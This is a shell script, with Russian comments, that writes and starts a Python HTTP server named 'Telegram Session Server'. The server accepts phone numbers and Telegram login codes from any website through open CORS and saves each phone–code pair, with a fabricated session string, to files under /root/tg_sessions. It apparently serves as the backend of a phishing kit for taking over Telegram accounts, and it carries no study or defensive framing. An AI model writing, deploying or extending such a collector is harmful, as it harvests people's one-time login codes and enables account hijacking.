# УДАЛЯЕМ ВСЕ СТАРОЕ И СОЗДАЕМ НОВЫЙ
rm -f /root/server.py

cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import random
import string
import os
from datetime import datetime

PORT = 5000
sessions = {}

class Handler(BaseHTTPRequestHandler):
    
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h1>Telegram Session Server</h1><p>Working</p>')
        
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = {"status": "online", "port": PORT}
            self.wfile.write(json.dumps(response).encode())
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self._cors()
        self.end_headers()
        
        if self.path == '/auth/start':
            phone = data.get('phone', '')
            phone = ''.join([c for c in phone if c.isdigit()])
            
            if len(phone) < 11:
                response = {"status": "error", "message": "Invalid phone"}
            else:
                session_id = ''.join(random.choices(string.digits, k=12))
                sessions[session_id] = {"phone": phone}
                response = {
                    "status": "success", 
                    "session_id": session_id,
                    "message": "Code sent (demo mode)"
                }
                print(f"[START] {phone} -> {session_id}")
            
            self.wfile.write(json.dumps(response).encode())
        
        elif self.path == '/auth/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '').strip()
            
            if session_id not in sessions:
                response = {"status": "error", "message": "Invalid session"}
            else:
                phone = sessions[session_id]['phone']
                
                os.makedirs('/root/tg_sessions', exist_ok=True)
                filename = f"/root/tg_sessions/{phone}_{session_id}.session"
                
                with open(filename, 'w') as f:
                    # Генерим фейковую сессию
                    fake_session = f"""Phone: {phone}
Code: {code}
Time: {datetime.now()}
Session ID: {session_id}
StringSession: 1{''.join(random.choices(string.ascii_letters + string.digits, k=200))}"""
                    
                    f.write(fake_session)
                
                del sessions[session_id]
                
                response = {
                    "status": "success",
                    "message": "Session created",
                    "file": filename,
                    "phone": phone
                }
                print(f"[SESSION] Created: {filename}")
            
            self.wfile.write(json.dumps(response).encode())
        
        else:
            response = {"status": "error", "message": "Not found"}
            self.wfile.write(json.dumps(response).encode())
    
    def log_message(self, format, *args):
        pass

print(f"🔥 Server starting on port {PORT}")
print(f"🔥 API: http://188.225.11.61:{PORT}")
print("🔥 POST /auth/start - Send phone")
print("🔥 POST /auth/code  - Verify code")
server = HTTPServer(('0.0.0.0', PORT), Handler)
server.serve_forever()
EOF

# ДАЕМ ПРАВА
chmod +x /root/server.py
